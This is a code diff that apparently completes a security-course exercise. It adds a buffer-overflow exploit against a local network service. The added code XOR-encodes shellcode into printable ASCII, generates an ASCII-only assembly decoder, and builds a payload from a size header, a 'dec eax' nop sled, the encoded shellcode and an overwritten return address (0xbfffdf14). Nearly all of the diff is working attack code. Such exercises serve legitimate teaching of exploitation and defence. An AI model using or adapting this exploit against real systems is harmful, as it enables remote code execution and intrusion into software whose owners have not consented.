@@ -3,6 +3,7 @@ import os
 import socket
 import traceback
 import q2
+import struct
 
 from infosec.core import assemble, smoke
 from typing import Tuple, Iterable
@@ -14,12 +15,16 @@ LOCAL_PORT = 1337
 
 
 ASCII_MAX = 0x7f
-
+ALL_ONES_BYTE = 0xff
 DECODER_FILE_PATH = "decoder.asm"
 
 NEW_LINE = "\n"
+# decrement eax as nop because the eax is overriten right after the nop silde
+DEC_EAX_AS_NOP = "\x48".encode('latin1')
 
-INC_EBX_AS_NOP = "\x66\x31\xf6"
+PATCHED_RET_ADDR = 0xbfffdf14
+
+SIZE_OVERFLOW = 1040 
 
 def warn_invalid_ascii(selector=None):
     selector = selector or (lambda x: x)
@@ -63,8 +68,15 @@ def encode(data: bytes) -> Tuple[bytes, Iterable[int]]:
 
     for idx, byte in enumerate(data_bytes_lst):
         if byte <= ASCII_MAX:
-            continue
-        data_bytes_lst[idx] ^= ASCII_MAX
+           # ascii byte
+           continue
+        # not an ascii byte xor 0xff to make an ascii byte
+        # which works because the xor 0xff flips all the bits and thus
+        # encode(x) + x = 0xff while x >= 0x80 and thus encode(x) < 0x80
+        # thus ascii byte
+        data_bytes_lst[idx] ^= ALL_ONES_BYTE
+        # save the indec of the byte that I encoded in order to decode over
+        # in the decoder
         patched_indexes.append(idx)
     
     patched_data = bytes(data_bytes_lst)
@@ -88,13 +100,19 @@ def get_decoder_code(indices: Iterable[int]) -> bytes:
          The decoder coder (assembled, as bytes)
     """
     decoder_code = ""
+    # ascii bytes code that effectivly does:
+    # mov bl, 0xff  
+    decoder_code += "push 0x100" + NEW_LINE
+    decoder_code += "pop ebx" + NEW_LINE
+    decoder_code += "dec ebx" + NEW_LINE
+    # over all the bytes that were not ascii
     for idx in indices:
-        # ascii bytes code that effectivly does:
-        # mov bl, 0xff 
-        decoder_code += "push 0x100" + NEW_LINE
-        decoder_code += "pop ebx" + NEW_LINE
-        decoder_code += "dec ebx" + NEW_LINE
+        # decode into the shellcode byte
+        # decode(encode(x)) = ((x ^ 0xff) ^ 0xff) = (x ^ (0xff ^ 0xff)) = 
+        # x ^ 0 = x
         decoder_code += f"xor byte ptr [eax + {idx}], bl" + NEW_LINE
+    
+    # write the decoder code into a file
     with open(DECODER_FILE_PATH, "w") as writer:
         writer.write(decoder_code)
     return assemble.assemble_file(DECODER_FILE_PATH)
@@ -125,10 +143,25 @@ def get_ascii_shellcode() -> bytes:
     Returns:
          The bytes of the shellcode.
     """
-    q2_shellcode = get_raw_shellcode()
-    # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
+    shellcode = get_raw_shellcode()
+    encoded_shellcode, patched_indices = encode(shellcode)
+    decoder = get_decoder_code(patched_indices)
+    # push esp
+    # pop eax
+    # effectivly ascii mov eax, esp
+    # "dec eax;" * (len(encoded_shellcode) + 4)
+    # effectivly ascii sub eax, 4;sub eax, len(encoded_shellcode)
+    # to set eax for the decoder
+    eax_setup = assemble.assemble_data("push esp;pop eax;" + "dec eax;" * (len(encoded_shellcode) + 4))
+    # in the ascii shellcodde payload eax setup then decoder of the ascii shellcode
+    # then the shell code
+    return eax_setup + decoder + encoded_shellcode
 
+
+def into_hex_bytes(byte_seq: bytes) -> Iterable[str]:
+    # print the hex of byte in the bytes sequence for testing
+    hex_bytes = [hex(byte) for byte in list(byte_seq)]
+    return hex_bytes
 
 @warn_invalid_ascii(lambda payload: payload[4:-5])
 def get_payload() -> bytes:
@@ -145,11 +178,17 @@ def get_payload() -> bytes:
     Returns:
          The bytes of the payload.
     """
-    encoded_shellcode = get_encoded_shellcode()
-    # xor si, si
-    ret_addr = struct.pack("<I", 0x12345678)
-    payload = encoded_shellcode.rjust(1040, INC_EBX_AS_NOP) + ret_addr + "\0".encode('latin1')
+    ascii_shellcode = get_ascii_shellcode()
+    patched_ret_addr = struct.pack('<I', PATCHED_RET_ADDR)
+    size = network_order_uint32(SIZE_OVERFLOW + 4 + 1)
+    # payload is built with size of the message then the nop slide then the ascii shellcode then the patched return address and then the "\0" to finish the message
+    payload = size + ascii_shellcode.rjust(SIZE_OVERFLOW, DEC_EAX_AS_NOP) + patched_ret_addr + "\0".encode('latin1')
     return payload
+
+
+def network_order_uint32(value) -> bytes:
+    return struct.pack('>L', value)
+
 
 def main():
     # WARNING: DON'T EDIT THIS FUNCTION!
